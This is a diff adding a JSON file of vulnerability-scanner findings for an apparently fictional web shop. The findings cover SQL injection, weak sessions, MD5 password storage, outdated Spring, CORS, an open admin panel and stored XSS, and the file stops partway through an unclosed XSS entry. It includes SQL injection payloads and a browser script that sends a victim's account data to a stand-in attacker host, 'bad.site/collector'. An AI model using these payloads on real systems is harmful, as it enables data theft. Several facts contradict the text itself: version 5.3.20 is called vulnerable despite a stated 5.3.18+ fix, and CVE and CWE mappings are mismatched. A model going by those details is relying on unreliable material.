@@ -1,0 +1,401 @@
+[
+    {
+      "finding_id": "F-101",
+      "scanner": "OWASP ZAP",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:18:44Z",
+      "vulnerability": {
+        "owasp_id": "A03:2021",
+        "cwe_id": "CWE-89",
+        "title": "SQL Injection in order lookup",
+        "severity": "CRITICAL",
+        "description": "`orderId` parameter concatenated into raw SQL",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "api_endpoint",
+        "url": "https://shop.local/api/v1/orders/{orderId}",
+        "service": "order-svc",
+        "cluster": "prod-gke"
+      },
+      "detailed_description": "An **SQL Injection** exists in the order lookup API, allowing malicious SQL code to be injected via the `orderId` parameter. This occurs because user input is directly concatenated into an SQL query without proper sanitization. An attacker can modify the `orderId` value to alter the query's logic. For example, sending `orderId=' OR '1'='1` could return all orders by exploiting the always-true condition, or injecting `' UNION SELECT SLEEP(10);--` could delay the database response. **Impact:** Successful exploitation can **expose or modify sensitive data** in the database and potentially allow execution of administrative or OS commands if the database is extended in that way. The attacker could retrieve all customers’ order details, modify or delete records, or even escalate the attack to a full system compromise depending on the database’s capabilities. This vulnerability falls under OWASP *Injection* category (A03:2021) and is identified as **CWE-89 (SQL Injection)**.",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "note": "Critical severity. CVSS can vary: if no authentication is required (PR:N) and full DB compromise is possible, score is ~9.8 (Critical). Even if login is required (PR:L), it remains very high (e.g. CVSS 8.8)."
+      },
+      "exploitability": "**Exploitability:** Easy – SQL injections are well-known and broadly exploitable with automated tools like **sqlmap**, or manually by crafting malicious SQL syntax. The attacker does not need special privileges and can often exploit this via a normal user session or public input. The incidence rate of injection flaws is significant (found in up to ~19% of applications in some studies), and tools exist to automate finding such vulnerabilities.",
+      "affected_users": "All users of the application are at risk. If this order lookup can be accessed by customers, any attacker (or malicious user) could extract **all customers’ order data** and related personal information. If administrative queries are accessible, it could impact the entire database. In effect, **all data managed by the `order-svc`** could be compromised.",
+      "remediation": {
+        "recommendation": "Use **parameterized queries** or prepared statements instead of string concatenation. Implement strict server-side input validation (allow only expected numeric IDs, etc.) and use an ORM or stored procedures that do not concatenate SQL. Ensure least-privilege database access (so the service account cannot perform unauthorized actions even if injection occurs). Regularly test for SQL injection (e.g., using OWASP ZAP or other DAST/SAST tools) in the CI/CD pipeline.",
+        "complexity": "Low-to-Medium – Preventing SQL injection is well-understood: developers should parameterize queries and sanitize inputs. However, refactoring the data access code to use safe patterns might require moderate effort if the vulnerable code is widespread."
+      },
+      "example_exploit_scenario": "An attacker calls `GET /api/v1/orders/1'%20OR%20'1'%3D'1` (which URL-decodes to `1' OR '1'='1`). This modifies the SQL query to always be true, potentially dumping all order records. In testing, using `' OR '1'='1` in the `orderId` returned an entire orders list instead of a single order, confirming the SQL injection. Alternatively, the attacker could use a UNION query to extract other database tables, or a time-delay payload (`' UNION SELECT SLEEP(10)--`) to detect blind injection. Such exploitation can be done through a web browser or scripts, without needing direct database access."
+    },
+    {
+      "finding_id": "F-102",
+      "scanner": "BurpSuite",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:23:12Z",
+      "vulnerability": {
+        "owasp_id": "A07:2021",
+        "cwe_id": "CWE-287",
+        "title": "Predictable session IDs",
+        "severity": "HIGH",
+        "description": "`SESSIONID` is incremental; entropy < 32 bits",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "web_route",
+        "url": "https://shop.local/login",
+        "service": "auth-svc"
+      },
+      "detailed_description": "The application’s session identifiers appear to be **predictable or have low entropy**. Specifically, the `SESSIONID` values are incremental or otherwise sequential, implying fewer than 2^32 possible values. This means an attacker could guess or brute-force valid session IDs, leading to **session fixation or hijacking**. For example, if one user’s session ID is `1000100` and another user’s is `1000105`, an attacker can infer the pattern and attempt to steal a session by trying intermediate IDs. If successful, the attacker would immediately impersonate that user without needing credentials. Indeed, predictable session ID values make it easier for remote attackers to hijack active sessions. **Impact:** This is an **authentication bypass** / **account takeover** vector. An attacker who can predict session tokens can access other users’ accounts, view sensitive data, and perform actions as those users. In one case, a product with this flaw was assigned a CVSS 3.1 score of 9.8 (Critical) because of the ease of full account compromise. While exact impact depends on what the compromised accounts can do, the worst case includes exposing personal data and performing privileged operations as victims. This vulnerability corresponds to OWASP 2017/2021 *Identification and Authentication Failures* (A07) and **CWE-287 (Improper Authentication)**.",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "note": "High to Critical severity. If an attacker can hijack any user session (including admin) without credentials, impact is equivalent to full account takeover. For instance, CVE-2018-11741 (predictable session IDs in a web system) was rated CVSS 9.8. The score might be slightly lower if some conditions (like needing to be on the same network or partial impact) applied, but generally this is Critical."
+      },
+      "exploitability": "**Exploitability:** Easy to Moderate. If the pattern of session IDs is truly incremental or guessable, an attacker can write a simple script to cycle through possible session tokens or predict the next token after observing one session. Tools like Burp Suite’s Intruder or sequencer can detect and exploit weak session randomness. Without rate limiting, an attacker could attempt thousands of session IDs per second. There have been cases where only a modest number of attempts were needed to find a valid session. The attack does not require user interaction; the attacker simply needs any low-privileged session or observation of a few session values to derive the pattern. If the application doesn’t tie sessions to IP or enforce one session per user, the attacker’s job is even easier.",
+      "affected_users": "Potentially **all users** of the system are affected. Any active session could be taken over by an attacker who predicts its token. If administrative sessions follow the same scheme, this could allow an external attacker to compromise an admin account. This could impact all customers and the application’s integrity (if an admin account is compromised, the attacker controls the entire app). Even regular user session compromise is serious, as personal data can be stolen or transactions made without authorization.",
+      "remediation": {
+        "recommendation": "Use **cryptographically secure, high-entropy session identifiers**. Session IDs should be at least 128 bits of entropy (e.g., generated by a CSPRNG) and **not sequential**. Frameworks often handle this; ensure the application isn’t overriding with a weak mechanism. Implement session fixation protections (rotate session ID after login). Also, **monitor and rate-limit** failed session validations (many incorrect session IDs) to detect brute-force attempts. Flag abnormal session usage patterns (e.g., multiple geographic IPs using the same session ID) for investigation:contentReference[oaicite:12]{index=12}.",
+        "complexity": "Low – Most modern web frameworks can generate secure session IDs by default. The fix may simply involve configuring the server to use a robust session manager. Ensuring no reliance on predictable values (like auto-incrementing counters) for session tokens is key. Thus, remediation is typically a configuration/code change and retesting."
+      },
+      "example_exploit_scenario": "After logging in, a user observes their `SESSIONID` cookie is `ABC123000`. The attacker notices another user’s session ID (perhaps via an info leak or by guessing) was `ABC123005`. Recognizing the pattern, the attacker guesses that session `ABC123004` might be valid. They craft a request to the application with `SESSIONID=ABC123004`. If that session is active, the attacker now impersonates that user. In a real incident, researchers discovered an admin interface that allowed session IDs as a URL parameter and found they were sequential; by incrementing the value, they accessed another user’s account without needing to log in. This demonstrates how trivial arithmetic or brute force can compromise accounts if IDs are predictable."
+    },
+    {
+      "finding_id": "F-103",
+      "scanner": "Semgrep",
+      "scan_id": "code-2025-06-18",
+      "timestamp": "2025-06-18T22:51:10Z",
+      "vulnerability": {
+        "owasp_id": "A02:2021",
+        "cwe_id": "CWE-256",
+        "title": "Passwords stored as MD5 hashes",
+        "severity": "HIGH",
+        "description": "`crypto.createHash('md5')` spotted in `userModel.js`",
+        "vector": "code"
+      },
+      "asset": {
+        "type": "source_file",
+        "path": "services/auth-svc/src/models/userModel.js",
+        "repo": "github.com/org/shop"
+      },
+      "detailed_description": "The authentication service stores passwords using **MD5 hashes**, which is a weak and **cryptographically broken** hashing algorithm for passwords. MD5 hashes are fast to compute and have known vulnerabilities (collisions, etc.), making them highly susceptible to brute-force cracking. **Impact:** If an attacker gains read access to the password database (for instance, via SQL injection or an insider threat), they could **crack most user passwords in a short time**. Modern hardware can compute MD5 at extreme speeds (on the order of 10^8–10^11 hashes per second on a single GPU). For example, an unsalted 8-character password hashed with MD5 can often be cracked in minutes to hours. This exposure could lead to complete account compromise for all users, and if users reuse passwords on other services, those could be at risk too. Additionally, MD5 has no resistance against rainbow table attacks; huge precomputed tables exist for common passwords, further reducing the effort to recover plaintext. This finding is a **Cryptographic Failure** (OWASP A02:2021) and maps to **CWE-256 (Plaintext Storage of Password)** – effectively, using MD5 is considered almost as bad as plaintext because of how easily it can be reversed.",
+      "cvss": {
+        "base_score": 7.4,
+        "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "note": "This issue by itself does not give direct unauthorized access, so it might not have a high network-exploitable score. But if combined with any data leakage, it dramatically worsens impact. We treat it as a high-severity design flaw. (No official CVSS since it’s a weakness, but assuming an attacker can obtain the hashes, the confidentiality and integrity of user accounts are at severe risk.)"
+      },
+      "exploitability": "**Exploitability:** Moderate. On its own, stored MD5 hashes require the attacker to first obtain the hash data (e.g., via another vulnerability or leak). However, **if hashes are obtained, cracking them is highly feasible**. MD5’s speed and lack of salting mean that an attacker can attempt billions of guesses per second. Using common password lists and GPU clusters or cloud computing, an attacker can recover a large percentage of passwords very quickly (often >70% of users use passwords crackable within days if hashed with MD5). Thus, the difficulty lies in obtaining the hashes; once obtained, the barrier to exploit (recover plaintexts) is low. There are also publicly available rainbow tables for MD5 that allow instant lookup of many hashed values.",
+      "affected_users": "Potentially **every user in the system**. All stored passwords are inadequately protected. In the event of a breach, user accounts can be compromised. This is especially severe for high-privilege accounts (admins) and for users who reuse passwords elsewhere. For the service itself, this weakness means it lacks a second line of defense if the database is compromised. It also may violate compliance requirements (e.g., GDPR or PCI DSS) for proper password storage.",
+      "remediation": {
+        "recommendation": "Use a **strong hashing algorithm with salt and key stretching** (e.g., bcrypt, Argon2, or PBKDF2) for password storage. These algorithms are designed to be slow and resistant to brute force, and the salt prevents rainbow table attacks. Update the code in `userModel.js` to use a secure password hashing function (Node has libraries like bcrypt). Also, enforce a password policy to encourage strong passwords, which combined with proper hashing greatly increases security. Finally, consider requiring multi-factor authentication, so that even if passwords are cracked, an attacker cannot directly reuse them.",
+        "complexity": "Medium – Switching hashing algorithms in code is straightforward, but **migrating existing passwords** is more involved. Typically, all users would need to reset passwords or one could implement a mechanism to re-hash on login. Still, the development effort is reasonable and the security gain is significant. There may also be an operational aspect to ensure all developers and systems stop using MD5 for any purpose."
+      },
+      "example_exploit_scenario": "A database backup is accidentally exposed or stolen. The attacker finds a table `Users` with usernames and password hashes. The hashes are in MD5, identifiable by their 32-character hex format. The attacker uses a tool like Hashcat with a powerful GPU rig; given Hashcat’s ability to test ~164 billion MD5 hashes per second on a single modern GPU, the attacker cracks a large portion of the hashes overnight. Many passwords (like `password123`, `welcome1`) are recovered in plain text. The attacker can now log in as those users. If any administrative accounts were cracked, the attacker gains full control of the application. Additionally, if users reused those passwords on other sites (e.g., their email), the damage extends beyond this application."
+    },
+    {
+      "finding_id": "F-104",
+      "scanner": "Trivy",
+      "scan_id": "image-2025-06-17",
+      "timestamp": "2025-06-17T11:05:11Z",
+      "vulnerability": {
+        "owasp_id": "A06:2021",
+        "cve_id": "CVE-2023-30631",
+        "cwe_id": "CWE-502",
+        "title": "RCE in Spring Boot < 2.6.9",
+        "severity": "CRITICAL",
+        "description": "Outdated component `org.springframework:spring-web` 5.3.20",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "container_image",
+        "image": "order-svc:1.1.0",
+        "registry": "ghcr.io/org/order-svc"
+      },
+      "package": {
+        "ecosystem": "maven",
+        "name": "spring-web",
+        "version": "5.3.20"
+      },
+      "detailed_description": "The `order-svc:1.1.0` container includes **Spring Framework (spring-web 5.3.20)** which is vulnerable to a known **Remote Code Execution (RCE)** flaw. Specifically, Spring Boot versions < 2.6.9 (bundling Spring Framework < 5.3.18) are affected by critical exploits such as **Spring4Shell (CVE-2022-22965)** and an older deserialization issue **CVE-2016-1000027**. These vulnerabilities (CWE-502) allow attackers to send specially crafted requests that result in arbitrary code execution in the context of the application. **Impact:** An attacker can potentially **take full control of the `order-svc` service**. For example, in the Spring4Shell exploit, a malicious HTTP request can cause the application to write a web shell or execute arbitrary OS commands. This could lead to complete compromise of the server hosting this container, unauthorized access to data, and pivoting to other systems. Given that this is a core framework component, the issue is remotely exploitable without authentication in typical scenarios (the app just needs to receive untrusted data in a way that triggers the vulnerability). This finding falls under OWASP category A06:2021 (Vulnerable and Outdated Components) – using a library version with a known critical flaw.",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "note": "Critical. For instance, Spring4Shell was scored 9.8 (Critical). No privileges or user interaction required, network exploitable, and yields full confidentiality, integrity, availability impact."
+      },
+      "exploitability": "**Exploitability:** High. Exploits for these Spring vulnerabilities are publicly available and were actively used in the wild soon after disclosure. Attackers often scan the internet for vulnerable Spring instances within **minutes** of new CVEs being announced. If `order-svc` is accessible, an attacker could automate attacks. The complexity is low because the exploit payloads have been well-documented by security researchers and proof-of-concepts (for Spring4Shell, a simple crafted HTTP POST request can drop a shell). Note that exploitation may require specific application conditions (for Spring4Shell, the app must be deployed as a WAR on Tomcat, etc.), but assuming `order-svc` meets those, the attacker does not need credentials or special access.",
+      "affected_users": "All functionality of the `order-svc` and any data it manages are at risk. An attacker gaining RCE on this service could access **all orders data**, and potentially move laterally to other services (especially if the container runs with privileges in the cluster). Users of the application might experience data theft or manipulation (e.g., orders could be altered or exfiltrated). Also, a compromised service could be used to attack customers (e.g., sending malicious responses). Essentially, the impact extends to the entire system trust boundary, not just individual users.",
+      "remediation": {
+        "recommendation": "Upgrade the Spring Boot/Spring Framework library to a **patched version**. For Spring4Shell, the issue is fixed in Spring Framework 5.3.18+ and 5.2.20+ (or Spring Boot 2.6.6/2.5.12 and above). Given this finding, update `org.springframework:spring-web` from 5.3.20 to the latest 5.3.x release (or consider moving to Spring 6 if possible). Also, review code for usage of Java serialization or dangerous patterns. As a defense in depth, ensure the service runs with least privileges (so an RCE doesn’t automatically mean root access to the host) and enable the Java Security Manager or container isolation to limit damage. Finally, apply WAF rules or other mitigations recommended by Spring for these CVEs, and test the application after upgrade.",
+        "complexity": "Medium – Updating a core framework like Spring might require re-testing the application for compatibility. However, patches for these issues are available and should not require significant code changes beyond the version bump. The primary effort is in validation and deployment. Delaying this fix is high risk given active exploits, so the update should be prioritized."
+      },
+      "related_findings": ["F-107"],
+      "example_exploit_scenario": "An attacker finds that the `order-svc` is using Spring Boot 2.6.0. They craft a malicious HTTP request exploiting Spring4Shell: for example, sending a specially crafted form submission that triggers object binding to a class like `ClassLoader`. Upon success, this allows writing a web shell file to the server. The attacker then accesses the web shell and executes OS commands, fully compromising the container. In another scenario, if the service were using default Java deserialization on certain endpoints, the attacker could send a serialized payload that leverages the known vulnerability (CVE-2016-1000027) to execute code remotely. In either case, the outcome is the attacker can run arbitrary code with the permissions of the `order-svc` process, which likely gives access to the database and other internal resources."
+    },
+    {
+      "finding_id": "F-105",
+      "scanner": "OWASP ZAP",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:26:49Z",
+      "vulnerability": {
+        "owasp_id": "A05:2021",
+        "cwe_id": "CWE-693",
+        "title": "CORS misconfiguration allows `*` origin with credentials",
+        "severity": "HIGH",
+        "description": "`Access-Control-Allow-Credentials: true` with wildcard Origin",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "api_endpoint",
+        "url": "https://api.shop.local/*",
+        "service": "gateway"
+      },
+      "detailed_description": "The API gateway is misconfigured to allow **Cross-Origin Resource Sharing (CORS)** from any origin (`Access-Control-Allow-Origin: *`) while also permitting credentials (`Access-Control-Allow-Credentials: true`). This configuration is inherently insecure. **Impact:** In modern browsers, if a response includes `ACA-Origin: *` alongside `ACA-Credentials: true`, the browser will refuse to grant the calling web page access to the response, per the CORS spec. However, this misconfiguration suggests the server may not be enforcing origin restrictions properly. If an attacker finds a way to abuse this (for instance, by the server echoing back the Origin or by exploiting older user agents), it could allow any website to issue AJAX requests to the API on behalf of a user and read the responses. In effect, a malicious site could silently perform privileged actions or retrieve sensitive data by leveraging a logged-in user's session (cookies or tokens) – essentially a **cross-site request forgery that exposes response data**. For instance, an attacker could host evil.com and when a logged-in user visits that page, a script could call `fetch('https://api.shop.local/endpoint', {credentials: 'include'})` and obtain the response, because the API erroneously allows it. This could expose personal data, transaction records, or CSRF-protected actions to attackers. The OWASP testing guide notes that although `*` should not be allowed with credentials (and browsers block it), a server misconfiguring CORS in this way is dangerous if the application relies solely on the client to enforce origin checks. In summary, this is categorized as a **Security Misconfiguration** (OWASP A05) and it undermines the same-origin policy designed to protect sensitive data.",
+      "cvss": {
+        "base_score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+        "note": "Moderate to High severity. Exploitation requires tricking a user into visiting a malicious page (UI:R), but no privileges are needed by the attacker otherwise. Confidentiality and integrity can be fully compromised for that user’s data/actions. Some scoring models might consider scope changed since another origin is involved, which could raise the score slightly."
+      },
+      "exploitability": "**Exploitability:** Moderate. The attacker must lure a victim (who is logged into shop.local) to visit an attacker-controlled web page. This could be done via phishing or a malicious advertisement. Once the victim is on that page, the exploit is trivial: using a bit of JavaScript, the attacker’s page can send requests to `https://api.shop.local` and, due to the misconfiguration, potentially read the responses. This doesn’t require any special tools beyond a web browser. If the misconfiguration is confirmed to be exploitable, any attacker who can get a user to open a link can attack. This is essentially an automated CSRF with data exfiltration. The challenge for the attacker is purely social (getting the user to load the malicious page). Technical difficulty is low since the same-origin policy is intentionally being bypassed by the server’s CORS policy.",
+      "affected_users": "Any user of the application who can be tricked into visiting an untrusted website is at risk. That means practically all users are potential targets, since an attack could be delivered via a link or embedded script on any site. If administrators or privileged users use the application and then visit a malicious site, they are especially juicy targets (an attacker could steal admin API data or perform admin actions). Essentially, **the entire user base is vulnerable to having their data accessed by untrusted origins**. Also, if the API is consumed by a JavaScript frontend, that front-end’s integrity is reliant on the CORS policy; a bad actor could create a rogue front-end to interact with the API from anywhere.",
+      "remediation": {
+        "recommendation": "Fix the CORS headers to be restrictive. **If credentials are allowed**, do not use `*` as the allowed origin. Instead, explicitly specify trusted origins (e.g., your web app’s domain) or dynamically echo the request’s Origin header *only* if it matches an allowlist. In the configuration, ensure that `Access-Control-Allow-Origin` is not `*` when `Access-Control-Allow-Credentials: true` is set. If the API is internal or meant only for certain services, consider disabling CORS entirely or removing credential support. Also, verify that `Access-Control-Allow-Headers` and `Access-Control-Allow-Methods` are appropriately set to only what's needed. Finally, test using browser developer tools or CORS testing tools to ensure that no unauthorized origin can access responses (the application should respond with an error or no `Access-Control-Allow-Origin` for disallowed origins).",
+        "complexity": "Low – This is usually a configuration change at the API gateway or web server level. The main work is identifying the correct allowed origins and implementing the filter logic. It should be a quick fix to change `*` to a specific domain or to remove `Allow-Credentials` if not needed. Regression testing is straightforward: ensure the legitimate front-end still works and that requests from disallowed origins are blocked. If the misconfiguration was due to a code issue (like always echoing Origin), fix that logic."
+      },
+      "example_exploit_scenario": "The attacker creates a malicious page at `http://bad.site/steal.html` and tricks a logged-in user of shop.local to visit it (via an email link, for example). The page contains a script:\n```js\nfetch('https://api.shop.local/v1/account/details', {\n  credentials: 'include'\n})\n  .then(resp => resp.text())\n  .then(data => {\n    // Send data to attacker\n    fetch('http://bad.site/collector', { method: 'POST', body: data });\n  });\n```\nThis script silently invokes the shop.local API using the user’s session cookie and then sends the response data to the attacker’s server. Because the API incorrectly allowed `*` as an Origin with credentials, the request is accepted and the response is readable by the script. The attacker’s server now has the user’s personal info. In another variation, the script could perform state-changing actions (like `POST /v1/account/settings`) and read the results, effectively hijacking the user’s session via cross-origin requests. (Note: Modern browsers would normally block reading of the response in this scenario, but the presence of such misconfiguration indicates a serious logic error that could be exploitable in certain contexts.)"
+    },
+    {
+      "finding_id": "F-106",
+      "scanner": "OWASP ZAP",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:30:01Z",
+      "vulnerability": {
+        "owasp_id": "A01:2021",
+        "cwe_id": "CWE-284",
+        "title": "Broken access control on Admin panel",
+        "severity": "CRITICAL",
+        "description": "`/admin/*` accessible to unauthenticated users",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "web_route",
+        "url": "https://shop.local/admin",
+        "service": "frontend"
+      },
+      "detailed_description": "The application’s admin interface (`/admin` routes) lacks proper access control, meaning **unauthenticated users (or normal users) can access admin-only pages or functionality**. This is the very definition of **Broken Access Control**, which is OWASP’s #1 web security risk in 2021. **Impact:** An attacker can directly reach privileged admin functions. This could include viewing sensitive admin dashboards, modifying data, managing user accounts, or any critical operations intended only for administrators. Essentially, the attacker can perform any action that an admin user could, without having to log in. For instance, if there is an `/admin/user-management` page, an attacker could load it and possibly create or delete users arbitrarily. The failure to enforce admin-only authentication means the **complete compromise of the application’s integrity** – the attacker is acting outside of any intended permissions. This scenario aligns with CWE-284 (Improper Access Control) and is exemplified by OWASP Top10 guidance where *\"an attacker simply force-browses to admin URLs and, if allowed, it's a flaw\"*. In short, this is one of the most severe security lapses, potentially allowing full takeover of the application’s functionality.",
+      "cvss": {
+        "base_score": 10.0,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "note": "Critical. No authentication needed (PR:N), network-accessible, no user interaction – and it grants an attacker full privileges in the system, affecting confidentiality, integrity, and availability. This is effectively a worst-case scenario, often considered a 10.0 on CVSS. Even if scope is considered unchanged (same application), the direct admin access merits the highest severity."
+      },
+      "exploitability": "**Exploitability:** Trivial. An attacker simply needs to know or guess the URL of admin pages (which is `/admin` as given). There is no login required, so they can directly access these pages. This could be discovered just by browsing the site’s URLs or via search engines if any admin pages are indexed. There’s no special tool or expertise needed beyond a web browser. Automated scanners (like ZAP) already detected it. In an attack, the adversary could script automated calls to admin API endpoints as well, since no tokens or cookies are needed. Essentially, **the admin portal is wide open**, and any bot or attacker can walk right in.",
+      "affected_users": "All users and the application as a whole. If an attacker can act as an admin, they can likely read any user’s data, change any content, or take the application offline. For example, they could steal all personal data (impacting all users’ confidentiality), or delete products/orders (integrity/availability impact). From a business perspective, this is catastrophic: user trust would be lost, data breaches would have to be disclosed, and the system could be abused to defraud users. Internal staff might lose control over the system until the issue is fixed.",
+      "remediation": {
+        "recommendation": "Immediately enforce authentication and authorization on all admin routes. The `/admin` section should require a logged-in account with an admin role. Implement middleware or route guards to check credentials; if not authenticated as admin, the server should return HTTP 403 or redirect to login. Also, ensure that admin accounts use strong passwords and 2FA, since once the door is locked, attackers may try credential stuffing. Beyond fixing the config/code, conduct an audit of all sensitive functions to ensure proper access control (principle of least privilege). It’s also wise to remove any default admin accounts or credentials and ensure the admin interface is not exposed to the public internet if not necessary (e.g., restrict by IP or VPN for admin access).",
+        "complexity": "Low – The fix is straightforward: add the missing authentication check. Most frameworks allow securing routes with a few lines of code or configuration. The challenge might be to ensure every admin endpoint is covered and to test that normal users truly have no access. If no authentication module exists at all for admin, one must be added (which is a larger project but absolutely essential). Regardless, given the severity, this fix should be implemented and deployed as an emergency patch."
+      },
+      "example_exploit_scenario": "An attacker visits `https://shop.local/admin` and finds that the admin dashboard loads without any login prompt. They see options to manage users and orders. The attacker uses the **user management** feature to elevate their own account to an administrator or create a new admin account for persistence. They then use the **orders management** to download all customers’ orders (including personal data) and issue fraudulent refunds. They might also navigate to configuration sections and introduce a malicious payload (for example, changing the site’s payment gateway to one under the attacker’s control). All these actions are done without ever supplying credentials. This mirrors a real-world incident where a “hidden” admin URL was left unprotected – attackers simply accessed it and gained full control, resulting in a major breach."
+    },
+    {
+      "finding_id": "F-107",
+      "scanner": "Snyk",
+      "scan_id": "sbom-2025-06-17",
+      "timestamp": "2025-06-17T11:05:11Z",
+      "vulnerability": {
+        "owasp_id": "A06:2021",
+        "cve_id": "CVE-2023-30631",
+        "cwe_id": "CWE-502",
+        "title": "RCE in Spring Boot < 2.6.9 (auth-svc)",
+        "severity": "CRITICAL",
+        "description": "Same outdated Spring component as F-104, but in auth-svc image",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "container_image",
+        "image": "auth-svc:0.9.1",
+        "registry": "ghcr.io/org/auth-svc"
+      },
+      "package": {
+        "ecosystem": "maven",
+        "name": "spring-web",
+        "version": "5.3.20"
+      },
+      "detailed_description": "This finding mirrors **F-104**: the `auth-svc:0.9.1` container uses Spring Framework version 5.3.20, which is vulnerable to the same RCE issues (e.g., Spring4Shell). In the authentication service context, an RCE could be even more devastating because the service likely handles credentials, tokens, and other sensitive logic. **Impact:** An attacker exploiting this in `auth-svc` could steal user credentials/tokens, generate tokens arbitrarily, or completely subvert authentication for the platform. Essentially, they could **bypass or disable the entire login/authentication system**. The impact extends to complete account takeover for all users and potential further compromise of other services by impersonating users or administrators. This is again OWASP A06 (Using Vulnerable Components) and CWE-502 (deserialization leading to RCE). The technical root cause and severity are the same as in F-104 – an outdated Spring Core library that is susceptible to remote code execution. Notably, multiple services using the same vulnerable component increases the overall risk, as an exploit developed for one service can be reused against the other.",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "note": "Critical (same rationale as F-104). All conditions for a 9.8 CVSS are met: network attack, no creds, no user interaction, full impact."
+      },
+      "exploitability": "**Exploitability:** High. Since this is the same underlying flaw as in F-104, the exploit code or techniques would be identical. Attackers scanning for Spring vulnerabilities will target any service running the affected version. If `auth-svc` exposes any endpoints that handle user input (e.g., login or token endpoints), those could be vectors. Given that exploits are publicly available and widely discussed, even low-skilled attackers could attempt them. The presence of this vulnerability in two services (order-svc and auth-svc) means an attacker has multiple potential targets; compromising either yields a foothold. The authentication service might be especially targeted because of the keys and secrets it may hold (for token signing, user data, etc.).",
+      "affected_users": "All users of the platform are indirectly affected. If `auth-svc` is compromised, **no user account can be trusted** – attackers could generate valid JWTs or session cookies and log in as anyone (including admins). They could also harvest passwords if the service logs or stores them (though passwords are hashed, see F-103, an attacker with code execution could dump those hashes or intercept credentials in memory). A compromised auth-svc undermines the entire authentication and authorization infrastructure, putting every other service and every piece of data at risk. In essence, **the entire application falls** if auth-svc is owned by an attacker.",
+      "remediation": {
+        "recommendation": "As with F-104, upgrade Spring to a safe version (apply the official patches addressing these RCEs). Specifically, bring Spring Framework to 5.3.18+ or Spring Boot to 2.6.9 or later. Given the critical role of `auth-svc`, deploy this patch immediately and consider rotating any secrets that might have been exposed (for example, if JWT signing keys are accessible in memory or config, assume breach and replace them after patching). In addition, after patching, thoroughly test authentication flows to ensure no functionality broke. Deploy intrusion detection or extra logging on this service – because if it was exploited prior to the fix, you’d want to detect any malicious persistence (e.g., new admin accounts, unexpected outgoing connections).",
+        "complexity": "Medium – Same complexity as updating order-svc. Possibly easier if both services share a build process or at least the upgrade steps can be done in tandem. Coordination is needed to update and redeploy, but no application-level code changes beyond dependency version bumps are expected. Testing is crucial but the change is confined to the framework library version. The urgency is high, so even if some refactoring is needed, it should be done promptly."
+      },
+      "related_findings": ["F-104"],
+      "example_exploit_scenario": "Using a publicly available Spring4Shell exploit tool, an attacker targets the auth-svc endpoint (e.g., `https://auth.shop.local/login`). The exploit sends a crafted request that causes the auth service to write a malicious JSP file into its web directory. The attacker then accesses `https://auth.shop.local/shell.jsp` (for example) to get a remote shell on the server. Now the attacker has control: they read environment variables and find a database URL and credentials for the user database. They query the database and dump all user accounts (including password hashes). They also find the JWT signing secret in the service’s configuration. Using this, the attacker forges an administrator JWT token and calls other service APIs as an admin, fully compromising all data. This multi-step chain – exploiting an outdated Spring component in auth-svc, then leveraging stolen secrets – illustrates how severe the impact is. (Each step would be preventable by addressing the issues like F-104/F-107 and F-103 in advance.)"
+    },
+    {
+      "finding_id": "F-108",
+      "scanner": "BurpSuite",
+      "scan_id": "web-scan-2025-06-20",
+      "timestamp": "2025-06-20T04:34:55Z",
+      "vulnerability": {
+        "owasp_id": "A04:2021",
+        "cwe_id": "CWE-79",
+        "title": "Stored XSS in profile bio",
+        "severity": "HIGH",
+        "description": "`<script>` saved to `/account/profile` and reflected in other users’ pages",
+        "vector": "network"
+      },
+      "asset": {
+        "type": "web_route",
+        "url": "https://shop.local/account/profile",
+        "service": "frontend"
+      },
+      "detailed_description": "The application fails to neutralize malicious script content in the **profile bio** field, allowing an attacker to inject JavaScript that gets stored and served to other users. This is a classic **Stored Cross-Site Scripting (XSS)** vulnerability (CWE-79). **Impact:** When another user (or an admin) views the attacker’s profile (or any page that includes the attacker’s bio), the malicious script executes in that user’s browser. This can lead to a wide range of attacks: the script could steal the user’s session cookie and send it to the attacker, enabling account hijacking. It could alter the content of the page (defacement) or perform actions on the user’s behalf (such as initiating transactions or changing settings). If an administrator views the content, the script could perform administrative actions or create a new admin user (using the admin’s credentials). Essentially, **any user who views the injected content can have their account compromised** without realizing it. Stored XSS is particularly dangerous because it is a one-to-many attack – one injection can affect every user who views it. (OWASP Top 10 maps XSS under Injection in A03:2021, but it remains one of the most prevalent web vulnerabilities.)",
+      "cvss": {
+        "base_score": 8.0,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
+        "note": "High severity. The attacker needs a low-privilege account to inject the script (hence PR:L if sign-up is required), and a victim must load the page (UI:R). Scope is Changed (attacker’s payload stored in server causes execution in victim’s browser context) – a similar stored XSS was assigned CVSS 8.5. When exploitation can lead to session theft and privileged actions, Confidentiality and Integrity impacts are High for the victim user."
+      },
